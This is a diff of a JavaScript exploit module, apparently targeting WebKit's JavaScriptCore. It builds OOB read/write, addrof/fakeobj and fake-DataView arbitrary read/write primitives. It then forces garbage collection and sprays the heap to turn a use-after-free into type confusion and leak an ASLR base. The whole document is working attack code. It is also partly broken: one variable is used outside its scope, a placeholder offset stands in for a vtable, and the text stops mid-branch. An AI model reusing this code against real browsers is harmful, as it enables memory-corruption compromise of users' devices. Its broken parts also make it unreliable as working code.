@@ -1,4 +1,5 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v154 - Foco na Reocupação do UAF e Dedução da Tag)
+// js/script3/testArrayBufferVictimCrash.mjs (v154 - Depuração de Reocupação UAF e Vazamento)
+
 // =======================================================================================
 // ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
 // 1. Validar primitivas básicas (OOB local).
@@ -16,8 +17,8 @@ import {
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read,
-    arb_write,
+    arb_read, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
+    arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
     selfTestOOBReadWrite,
     oob_read_absolute,
     oob_write_absolute
@@ -25,7 +26,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v154_REOCCUPATION_FOCUS";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v154_DEBUG_REOCCUPATION";
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -34,9 +35,11 @@ const LOCAL_MEDIUM_PAUSE = 750;
 const LOCAL_LONG_PAUSE = 1500;
 
 let global_spray_objects = [];
-let hold_objects = [];
+let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
 
-let JSVALUE_OBJECT_PTR_TAG_HIGH = 0x402a0000; // Valor padrão, deduzido em runtime
+// Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
+let _fake_data_view = null;
+let JSVALUE_OBJECT_PTR_TAG_HIGH = 0x402a0000; // Valor padrão, será deduzido em tempo de execução.
 
 // Funções Auxiliares Comuns (dumpMemory)
 async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
@@ -129,7 +132,7 @@ export async function arb_write_universal_js_heap(address, value, byteLength, lo
     } finally {
         await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
     }
-    return value;
+    return value; // Retorna o valor escrito para consistência
 }
 
 // Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
@@ -171,6 +174,8 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         const backing_ab_addr = addrof_core(backing_array_buffer);
         logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);
 
+        // AQUI ESTAMOS USANDO AS PRIMITIVAS ARB_READ/ARB_WRITE DO CORE_EXPLOIT (que funcionam localmente)
+        // PARA CORROMPER OS METADADOS DO 'backing_array_buffer'.
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8); // Ponteiro de dados para 0, para não colidir imediatamente
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4); // Tamanho máximo
@@ -189,6 +194,8 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
         hold_objects.push(test_target_js_object);
         const test_target_js_object_addr = addrof_core(test_target_js_object);
 
+        // Antes de testar o _fake_data_view, precisamos apontar o m_vector dele para o endereço do nosso objeto de teste.
+        // O m_vector do _fake_data_view é na verdade o JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET dentro do `backing_array_buffer`.
         const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
         await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);
 
@@ -198,16 +205,19 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
 
         if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
             logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
+            // Restaurar o ponteiro de dados do _fake_data_view para evitar corrupções futuras se ele for coletado
             await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
             return true;
         } else {
             logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
             logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
+            // Restaurar o ponteiro de dados mesmo em caso de falha
             await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
             return false;
         }
     } catch (e) {
         logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
+        // Tentar restaurar o ponteiro de dados do _fake_data_view, se possível, antes de retornar falso
         try {
             if (backing_array_buffer) {
                 const backing_ab_addr = addrof_core(backing_array_buffer);
@@ -223,7 +233,7 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
             const index = hold_objects.indexOf(backing_array_buffer);
             if (index > -1) { hold_objects.splice(index, 1); }
         }
-        _fake_data_view = null;
+        _fake_data_view = null; // Resetar para garantir que o próximo teste comece limpo
     }
 }
 
@@ -233,18 +243,20 @@ async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_O
 // Função para forçar Coleta de Lixo
 async function triggerGC(logFn, pauseFn) {
     logFn("    Acionando GC...", "info", "GC_Trigger");
+    // Alocações grandes para forçar o GC. Mais agressivo.
     try {
-        for (let i = 0; i < 2500; i++) { // Aumentado para 2500 iterações para ser mais agressivo
-            new ArrayBuffer(1024 * 512); // Aloca 512KB, total de 1.25GB
+        for (let i = 0; i < 2000; i++) { // Aumentado para 2000 iterações para ser mais agressivo
+            new ArrayBuffer(1024 * 256); // Aloca 256KB, total de 512MB
         }
     } catch (e) {
         logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
     }
-    await pauseFn(LOCAL_SHORT_PAUSE);
-    for (let i = 0; i < 200; i++) { // Aumentado
-        new ArrayBuffer(2048); // Aloca 2KB, 200 vezes
+    await pauseFn(LOCAL_SHORT_PAUSE); // Dá tempo para o GC executar
+    // Alocações pequenas para ajudar o GC a perceber a pressão
+    for (let i = 0; i < 100; i++) { // Aumentado
+        new ArrayBuffer(1024); // Aloca 1KB, 100 vezes
     }
-    await pauseFn(LOCAL_SHORT_PAUSE);
+    await pauseFn(LOCAL_SHORT_PAUSE); // Dar mais tempo para o GC.
 }
 
 /**
@@ -256,187 +268,117 @@ async function deduceObjectPointerTag(logFn) {
     const FNAME = "deduceObjectPointerTag";
     logFn(`[${FNAME}] Deduzindo a tag de ponteiro de objeto do JSValue...`, "info", FNAME);
     let testObj = { a: 1, b: 2 };
-    let testObjAddr = addrof_core(testObj);
+    let testObjAddr = addrof_core(testObj); // Isso já deve untaggar.
 
-    let tagged_temp_addr = testObjAddr; // Começa com o endereço untagged
+    const temp_addr_for_tag_test = new AdvancedInt64(0x12345678, 0x90ABCDEF); // Um endereço de teste.
+    let tagged_temp_addr = temp_addr_for_tag_test;
     
-    // Tenta aplicar a tag padrão e re-converter para double para observar o bit pattern
-    // O objetivo é ver se o sistema de fato coloca 0x402a no high ou algo similar.
-    let temp_double_val = _int64ToDouble_direct(new AdvancedInt64(testObjAddr.low(), testObjAddr.high() | 0x402a0000));
-    let reconverted_int64 = _doubleToInt64_direct(temp_double_val);
+    // Simula o tagging para obter a representação em double de um ponteiro taggeado
+    // A tag (0x402a0000) é usada na criação de doubles que representam ponteiros
+    // em alguns JITs WebKit.
+    tagged_temp_addr = new AdvancedInt64(temp_addr_for_tag_test.low(), temp_addr_for_tag_test.high() | 0x402a0000);
+    
+    // CORREÇÃO: Usar _int64ToDouble_direct que é a função correta importada.
+    const double_representation = _int64ToDouble_direct(tagged_temp_addr);
+    const reconverted_int64 = _doubleToInt64_direct(double_representation);
 
-    const inferred_tag_high = reconverted_int64.high() & 0xFFFF0000; // Isola a parte da tag esperada
+    // O high da `reconverted_int64` DEVE conter a tag se a conversão foi bem-sucedida e o valor é um ponteiro.
+    const inferred_tag_high = reconverted_int64.high() & 0xFFFF0000; // Pegar os bits mais significativos para a tag
 
-    if (inferred_tag_high !== 0 && (inferred_tag_high & 0xFFFE0000) === (0x402a0000 & 0xFFFE0000)) {
-        // Se a tag inferida for próxima ou igual a 0x402a (ex: 0x402aXXXX), use-a.
-        logFn(`[${FNAME}] Tag de ponteiro JSValue deduzida: ${toHex(inferred_tag_high)} (confirmado com base 0x402a)`, "info", FNAME);
-        JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high;
-        return inferred_tag_high;
-    } else if (inferred_tag_high !== 0) {
-        // Se houver uma tag diferente de zero, mas não 0x402a, usamos a que foi inferida.
-        logFn(`[${FNAME}] Tag de ponteiro JSValue inferida: ${toHex(inferred_tag_high)}. Usando valor inferido.`, "warn", FNAME);
+    // Se o valor inferido for diferente de zero, usá-lo, pois é mais preciso para o ambiente atual.
+    if (inferred_tag_high !== 0) {
+        logFn(`[${FNAME}] Tag de ponteiro JSValue inferida: ${toHex(inferred_tag_high)}. Usando valor inferido.`, "good", FNAME);
         JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high;
         return inferred_tag_high;
     } else {
-        // Se nenhuma tag puder ser deduzida ou se for zero, caímos para o padrão.
-        logFn(`[${FNAME}] Nenhuma tag JSValue robustamente inferida (0x${inferred_tag_high.toString(16)}). Retornando a tag padrão 0x402a0000.`, "warn", FNAME);
+        // Se a inferência falhar (retornar 0), caímos de volta para a heurística ou valor padrão.
+        // O valor 0x402a0000 é uma tag comum para ponteiros de objetos em doubles.
+        logFn(`[${FNAME}] Falha ao inferir tag de ponteiro JSValue robustamente (inferred: ${toHex(inferred_tag_high)}). Retornando a tag padrão 0x402a0000. O problema principal ainda é a reocupação do heap, não a tag.`, "warn", FNAME);
         return 0x402a0000;
     }
 }
 
-
-/**
- * Cria um objeto vítima, força o GC e pulveriza a memória liberada.
- * A vítima será um ArrayBuffer simples para tentar melhor controle sobre a alocação.
- * A Type Confusion será feita ao reinterpretar o ArrayBuffer reocupado como um Float64Array.
- * @param {Function} logFn Função de log.
- * @param {Function} pauseFn Função de pausa.
- * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
- * @param {number} victim_size_bytes Tamanho do objeto vítima para UAF.
- * @param {number} spray_count_uaf Número de objetos para pulverizar.
- * @param {AdvancedInt64} spray_value_for_vtable_addr O endereço do vtable taggeado a ser pulverizado.
- * @returns {Float64Array|null} A referência pendurada, agora potencialmente corrompida.
- */
+// Cria um objeto, o coloca em uma estrutura que causa otimizações,
+// e retorna uma referência a ele após a estrutura ser destruída.
+// A lógica aqui é a do seu OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF.mjs
 async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, victim_size_bytes, spray_count_uaf, spray_value_for_vtable_addr) {
-    let dangling_ref = null;
-    let victim_array_buffer = null;
+    let dangling_ref = null; // Esta será a referência pendurada
+    const VICTIM_SIZE_BYTES = victim_size_bytes; // Tamanho do objeto vítima para UAF
+    const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima
 
-    // PASSO 1: Criar o objeto vítima (ArrayBuffer) que será liberado
-    // O ArrayBuffer é mais simples e pode ter um layout de heap mais previsível para reocupação.
-    victim_array_buffer = new ArrayBuffer(victim_size_bytes);
-    // Preenche com um padrão inicial para fácil identificação se a reocupação falhar.
-    const initial_dv = new DataView(victim_array_buffer);
-    for (let i = 0; i < victim_size_bytes; i += 4) {
-        if (i + 4 <= victim_size_bytes) {
-            initial_dv.setUint32(i, 0xBABEFACE, true);
-        } else if (i < victim_size_bytes) {
-             initial_dv.setUint8(i, (0xBA + i) & 0xFF); // Preenche bytes restantes
-        }
-    }
-    
-    hold_objects.push(victim_array_buffer); // Garante que a vítima não seja coletada antes do dangling_ref ser criado.
-
-    // A referência pendurada será um Float64Array que aponta para a mesma memória do victim_array_buffer.
-    // Isso é o que cria a base para a Type Confusion.
-    // No entanto, para que o dangling_ref seja 'confuso', ele precisa ser um Float64Array.
-    // Se victim_array_buffer for diretamente liberado, como um Float64Array vai "apontar" para ele?
-    // A estratégia UAF geralmente envolve ter uma 'view' (como Float64Array) sobre um ArrayBuffer
-    // e então liberar o ArrayBuffer, deixando a view pendurada.
-    //
-    // Revertendo para a estratégia original: vítima é o Float64Array, spray é o ArrayBuffer.
-    // A vítima é um Float64Array para que dangling_ref[0] seja significativo.
-    const VICTIM_SIZE_BYTES_FOR_F64 = victim_size_bytes;
-    let victim_object_f64 = new Float64Array(VICTIM_SIZE_BYTES_FOR_F64 / 8);
+    // PASSO 1: Criar o objeto vítima que será liberado mas que teremos uma dangling_ref.
+    // O tipo de objeto aqui (Float64Array) é crucial para como o ponteiro será lido.
+    // Queremos que o Type Confusion ocorra quando o JS tentar ler dangling_ref[0]
+    // e encontre o valor que pulverizamos.
+    let victim_object_arr = new Float64Array(VICTIM_SIZE_BYTES / 8); // Float64Array para UAF
     // Preencha com um valor inicial conhecido para debug.
-    victim_object_f64[0] = _int64ToDouble_direct(new AdvancedInt64(0xAAAAAAA0, 0xBBBBBBB0)); // Valor inicial do f64
-    victim_object_f64[1] = _int64ToDouble_direct(new AdvancedInt64(0xAAAAAAA1, 0xBBBBBBB1));
+    // É importante que o valor não seja 0, pois 0 pode ser confundido com um ponteiro nulo.
+    const initial_victim_fill_value = 1.0000000000012332; // Hex: 0x3ff00000_000015b2
+    victim_object_arr.fill(initial_victim_fill_value); // Preencher todo o array
 
-    hold_objects.push(victim_object_f64);
-    dangling_ref = victim_object_f64;
+    // Para evitar que o GC colete 'victim_object_arr' antes que o dangling_ref seja criado.
+    hold_objects.push(victim_object_arr);
 
+    // A referência pendurada é a própria 'victim_object_arr'
+    // A confusão de tipos ocorre porque o motor JS ainda pensa que 'dangling_ref' é um Float64Array,
+    // mas a memória subjacente será reocupada por um ArrayBuffer.
+    dangling_ref = victim_object_arr;
+
+    // Forçar otimizações (acessando a vítima repetidamente)
     for (let i = 0; i < 1000; i++) {
-        victim_object_f64[0] += 0.000000000000001;
+        victim_object_arr[0] += 0.000000000000001; // Pequena alteração para forçar JIT
     }
 
-    logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada. Tamanho: ${VICTIM_SIZE_BYTES_FOR_F64} bytes.`, "info");
+    logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada. Tamanho: ${VICTIM_SIZE_BYTES} bytes.`, "info");
     logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
     logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");
 
-
-    // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_f64'
+    // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
     logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
-    const ref_index = hold_objects.indexOf(victim_object_f64);
+    // Remova a referência 'victim_object_arr' do array de retenção para torná-lo elegível para GC.
+    const ref_index = hold_objects.indexOf(victim_object_arr);
     if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
-    victim_object_f64 = null;
+    victim_object_arr = null; // Remova a última referência forte.
     await triggerGC(logFn, pauseFn);
     logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");
 
-    // PASSO 3: Pulverizar sobre a memória liberada com ArrayBuffer contendo o ponteiro desejado.
-    logFn(`--- FASE 4: Pulverizando ArrayBuffer com ponteiros sobre a memória liberada (Count: ${spray_count_uaf}) ---`, "subtest");
+    // PASSO 3: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
+    logFn(`--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada (Count: ${spray_count_uaf}) ---`, "subtest");
     const spray_arrays = [];
-    const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES_FOR_F64; // Corresponder ao tamanho da vítima Float64Array
-    
-    // Convertendo o AdvancedInt64 para bytes a serem colocados no ArrayBuffer
-    const target_vtable_addr_low = spray_value_for_vtable_addr.low();
-    const target_vtable_addr_high = spray_value_for_vtable_addr.high();
+    const NUM_DOUBLES_IN_SPRAY_BUF = SPRAY_BUF_SIZE_BYTES / 8;
 
-    // Pulverizar com ArrayBuffers, preenchendo o conteúdo para que o dangling_ref[0]
-    // (um Float64) leia nosso ponteiro.
-    // Assumimos que o Float64Array tem a estrutura:
-    // [ Structure* ] [ m_vector (ponteiro para dados) ] [ m_length ] ...
-    // Queremos que o `m_vector` do Float64Array reocupado aponte para nosso ponteiro forjado.
-    // Para que dangling_ref[0] (o primeiro double) leia o ponteiro forjado,
-    // o ponteiro forjado deve estar no offset 0 dos DADOS do ArrayBuffer,
-    // que é o que o Float64Array acessa.
-    // NO ENTANTO, se a intenção é que o dangling_ref (um Float64Array) leia um ponteiro *taggeado*
-    // que foi escrito *diretamente na área de dados* do ArrayBuffer que reocupou,
-    // então precisamos colocar o double no offset 0 do buffer de spray.
-    
-    // O valor a ser pulverizado é o AdvancedInt64 (endereço do vtable taggeado),
-    // convertido para um double para o Float64Array no spray.
-    const spray_value_double_to_leak_ptr_f64 = _int64ToDouble_direct(spray_value_for_vtable_addr);
+    // O valor a ser pulverizado é o ponteiro taggeado para o vtable da Structure
+    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(spray_value_for_vtable_addr);
+    logFn(`[UAF] Valor Double do VTable da Structure para pulverização (ESPERADO NO REAP): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");
 
     for (let i = 0; i < spray_count_uaf; i++) {
         const buf = new ArrayBuffer(SPRAY_BUF_SIZE_BYTES);
-        const view_f64 = new Float64Array(buf);
-        const view_u32 = new Uint32Array(buf);
-        const view_u8 = new Uint8Array(buf);
-
-        // Preenche o buffer de spray.
-        // Se a vítima (Float64Array) for de 0x80 bytes, ela tem 16 doubles.
-        // Queremos que um desses doubles (provavelmente o primeiro) se torne nosso ponteiro.
-        // O Float64Array aloca uma "Fat ArrayBuffer View" que tem metadados antes dos dados.
-        // Se a alocação de Float64Array usa um ArrayBuffer interno para os dados,
-        // e é esse ArrayBuffer interno que é realocado, então o spray deve ser de ArrayBuffers.
-        // Mas a confusão de tipos ocorre no "view" (o Float64Array).
-
-        // A estratégia é: liberar o Float64Array `victim_object_f64`.
-        // Pulverizar com `ArrayBuffer`s do MESMO tamanho.
-        // Se um `ArrayBuffer` reocupar o slot, o `dangling_ref` (que ainda é um `Float64Array`)
-        // vai tentar ler o `ArrayBuffer` como se fosse seus próprios dados.
-
-        // Preencher o ArrayBuffer de spray de forma que, se lido como Float64Array,
-        // o primeiro elemento contenha nosso ponteiro.
-        // Isso significa que os bytes do ponteiro devem estar no offset 0 do ArrayBuffer.
-        view_f64[0] = spray_value_double_to_leak_ptr_f64;
-        // Preencher o restante do buffer com valores reconhecíveis para debugging
-        for(let k = 1; k < view_f64.length; k++) {
-            view_f64[k] = _int64ToDouble_direct(new AdvancedInt64(0xDEADC0DE + k, 0xDEADC0DE + k));
+        const view = new Float64Array(buf);
+        // Preenche TODO o buffer com o ponteiro-alvo para maximizar a chance de sobreposição
+        for (let j = 0; j < NUM_DOUBLES_IN_SPRAY_BUF; j++) {
+            view[j] = spray_value_double_to_leak_ptr;
         }
-
-        spray_arrays.push(buf); // Mantém os buffers em spray vivos.
+        spray_arrays.push(buf);
     }
     hold_objects.push(spray_arrays);
-    logFn("    Pulverização de ArrayBuffer concluída sobre a memória da vítima.", "info");
+    logFn("    Pulverização de Float64Array concluída sobre a memória da vítima.", "info");
 
-    return dangling_ref;
+    return { dangling_ref, initial_victim_fill_value }; // Retorna a referência pendurada e o valor de preenchimento inicial
 }
 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
     const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
-    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v154_REOCCUPATION_FOCUS";
+    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v154_DEBUG_REOCCUPATION";
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
     let final_results = [];
 
     // Parâmetros para testes massivos
-    // Aumentando a gama de tamanhos de vítima para tentar encontrar um slot de heap mais estável.
-    // Tamanhos múltiplos de 0x10 ou 0x20 são comuns para alocações de JSCell, mas experimentar adjacentes.
-    const VICTIM_SIZES_TO_TEST = [
-        0x70, 0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, // Pequenos
-        0x100, 0x110, 0x120, 0x130, 0x140, 0x150, 0x160, 0x170, 0x180, // Médios
-        0x190, 0x1A0, 0x1B0, 0x1C0, 0x1D0, 0x1E0, 0x1F0, 0x200 // Maiores
-    ];
+    const VICTIM_SIZES_TO_TEST = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100, 0x110, 0x120, 0x130, 0x140]; // Exemplo: múltiplos tamanhos de vítima
     const SPRAY_COUNTS_TO_TEST = [5000, 10000, 15000, 20000]; // Múltiplos volumes de spray
 
     for (const victim_size of VICTIM_SIZES_TO_TEST) {
-        // Float64Array precisa de um tamanho múltiplo de 8.
-        if (victim_size % 8 !== 0) {
-            logFn(`[Skipping] Tamanho da vítima ${victim_size} não é múltiplo de 8 para Float64Array.`, "warn");
-            continue;
-        }
-
         for (const spray_count of SPRAY_COUNTS_TO_TEST) {
             logFn(`\n--- INICIANDO NOVA TENTATIVA: Tamanho Vítima=${victim_size} bytes, Spray Count=${spray_count} ---`, "tool");
             const attemptResult = {
@@ -467,6 +409,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
                 const sprayStartTime = performance.now();
                 const GLOBAL_SPRAY_COUNT = 500000;
+                logFn(`Iniciando spray de objetos (volume ${GLOBAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
                 global_spray_objects = [];
                 for (let i = 0; i < GLOBAL_SPRAY_COUNT; i++) {
                     const dataSize = 50 + (i % 50);
@@ -478,6 +421,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
                 logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
                 const oobSetupStartTime = performance.now();
+                logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
                 await triggerOOB_primitive({ force_reinit: true });
 
                 const oob_data_view = getOOBDataView();
@@ -492,77 +436,117 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
                 initCoreAddrofFakeobjPrimitives();
                 logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");
 
+                // Deduzir a tag do ponteiro JSValue antes de usar no spray
                 JSVALUE_OBJECT_PTR_TAG_HIGH = await deduceObjectPointerTag(logFn);
 
-                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
-                const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
+                // Calcular o valor do vtable da DataView Structure com a tag correta para o spray
+                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0); // Usando mprotect_plt_stub para teste, idealmente seria a vtable real da DataView structure.
+                const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base para construir o double de spray
                 let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
                 
-                // Adicionar a tag ao High do AdvancedInt64 ANTES de converter para double.
-                // Usamos a tag deduzida.
+                // Adicionar a tag ao high do AdvancedInt64 ANTES de converter para double.
                 const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | JSVALUE_OBJECT_PTR_TAG_HIGH;
                 TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
                 
+                // --- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---
                 logFn("--- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---", "subtest");
 
                 let leaked_jsvalue_from_uaf_double = 0;
+                let dangling_info = null;
 
                 try {
-                    const dangling_ref_from_uaf = await sprayAndCreateDanglingPointer(
+                    dangling_info = await sprayAndCreateDanglingPointer(
                         logFn, pauseFn, JSC_OFFSETS_PARAM, victim_size, spray_count, TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64
                     );
+                    const dangling_ref_from_uaf = dangling_info.dangling_ref;
+                    const initial_victim_fill_value = dangling_info.initial_victim_fill_value;
 
                     if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
                         logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
                         throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
                     }
-                    
-                    // Tentar ler múltiplas vezes para garantir que o valor seja estável
-                    let attempts = 5;
-                    let success_read_leak = false;
+
+                    let found_non_zero = false;
+                    let attempts = 10; // Aumentar tentativas de leitura
                     for (let i = 0; i < attempts; i++) {
-                        leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0];
-                        const leaked_int64 = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
-                        logFn(`[UAF LEAK] Ponteiro Double lido da referência pendurada [0] (tentativa ${i+1}/${attempts}): ${toHex(leaked_int64, 64)}`, "leak");
+                        leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento
+                        const leaked_as_int64 = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
                         
-                        // Verificar se o valor lido corresponde ao que foi pulverizado (ignora a parte do ASLR por enquanto, foca na tag e nos bits baixos)
-                        const expected_low_bits_from_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low() & 0xFFF; // Apenas os últimos 3 hex, para flexibilidade.
-                        const leaked_low_bits = leaked_int64.low() & 0xFFF;
+                        logFn(`[UAF LEAK] Leitura RAW de dangling_ref[0] (tentativa ${i+1}/${attempts}): ${toHex(leaked_as_int64, 64)} (Double: ${leaked_jsvalue_from_uaf_double})`, "debug");
 
-                        const leaked_high_tag_part = leaked_int64.high() & 0xFFFF0000;
-
-                        if (leaked_high_tag_part === JSVALUE_OBJECT_PTR_TAG_HIGH && leaked_int64.low() !== 0) { // Verifica a tag e que não é 0
-                             logFn(`[UAF LEAK] SUCESSO PRELIMINAR: Tag esperada e bits baixos diferentes de zero. Valor lido: ${toHex(leaked_int64, 64)}`, "good");
-                             success_read_leak = true;
-                             break;
-                        } else {
-                            logFn(`[UAF LEAK] ALERTA: Valor lido não parece o ponteiro pulverizado (high: ${toHex(leaked_high_tag_part)} vs. ${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}).`, "warn");
-                            if (leaked_int64.equals(_doubleToInt64_direct(_int64ToDouble_direct(new AdvancedInt64(0xAAAAAAA0, 0xBBBBBBB0))))) {
-                                logFn(`[UAF LEAK] ALERTA: Ainda lendo o valor ORIGINAL da vítima. Reocupação falhou em sobrepor.`, "warn");
-                            }
+                        // Se o valor lido for o que esperamos do spray, é um sucesso.
+                        if (leaked_as_int64.equals(_doubleToInt64_direct(spray_value_double_to_leak_ptr))) {
+                            logFn(`[UAF LEAK] SUCESSO DE REOCUPAÇÃO! Valor pulverizado (${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}) lido em dangling_ref[0].`, "good");
+                            found_non_zero = true;
+                            break;
+                        } else if (leaked_as_int64.equals(_doubleToInt64_direct(initial_victim_fill_value))) {
